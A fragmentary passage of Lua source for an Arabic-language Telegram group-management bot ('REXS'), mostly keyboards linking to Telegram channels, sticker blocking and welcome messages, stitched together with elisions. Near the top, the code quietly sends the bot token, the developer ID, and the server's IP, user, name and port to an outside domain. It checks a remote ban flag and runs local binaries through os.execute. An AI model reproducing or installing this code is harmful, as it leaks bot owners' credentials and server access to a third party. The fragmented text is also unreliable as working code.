...
data,res = https.request("https://nbgvy6.ml/ASHTRAKLUA/ytyp.php?Ban=REXS&Info&Id="..Id)
if res == 200 then
...
https.request("https://nbgvy6.ml/ASHTRAKLUA/ytyp.php?Get=REXS&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
print("::REXS::")
...
os.execute('chmod +x REXS;sudo chmod +x ./RXS;./RXS')
end
Files_Info_Get()
end 
...
{{text = '📂┇𝚆𝙰𝚃𝙰𝙽 𝚄𝙿𝙳𝙰𝚃𝙴𝚂.', url="t.me/QQOQQD"}},
}
...
send(msg.chat_id_,0," ✯︙العضو : {["..data.first_name_.."](t.me/QQOQQD)}\n✯︙["..REXS_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ✯︙عذرا » {["..data.first_name_.."](t.me/QQOQQD)}\n✯︙عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
database:set(bot_id.."Ttn:RXS:stats"..msg.chat_id_,"open")
end
...
database:set(bot_id.."Ttn:RXS:stats"..msg.chat_id_,"close")
end
if text and database:get(bot_id.."Ttn:RXS:stats"..msg.chat_id_) == "open" then 
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
if data.id_ then 
...
Text = "[⦑ Welcome to Source ⦒](t.me/QQOQQD)\n[✯ ⦑ SOURCE REXS ⦒](t.me/QQOQQD)\n✯ Source version : 2.7"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒄𝒉𝒂𝒏𝒏𝒆𝒍 𝒔𝒐𝒖𝒓𝒄𝒆',url="t.me/QQOQQD"},
{text = '𝒖𝒑𝒅𝒂𝒕𝒆 𝒔𝒐𝒖𝒓𝒄𝒆',url="t.me/REXSupdate"}},
{{text = '𝒊𝒏𝒔𝒕𝒂𝒍𝒍 𝒔𝒐𝒖𝒓𝒄𝒆',url="https://t.me/QQOQQD/7"},
...
{{text = '✯︙ChAnNeL OF SoURcE',url="t.me/QQOQQD"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/QQOQQD&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
...
Text = [[
[✯︙ChAnNeL OF SoURcE](https://t.me/QQOQQD)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✯︙ChAnNeL OF SoURcE',url="t.me/QQOQQD"}},
...
{{text = 'REXS TeaM .', url="t.me/QQOQQD"}},
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽.',url="t.me/QQOQQD"}},
}
local msg_id = msg.id_/2097152/0.5
...
{
{text = '𝐖𝐀𝐓𝐀𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/QQOQQD"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
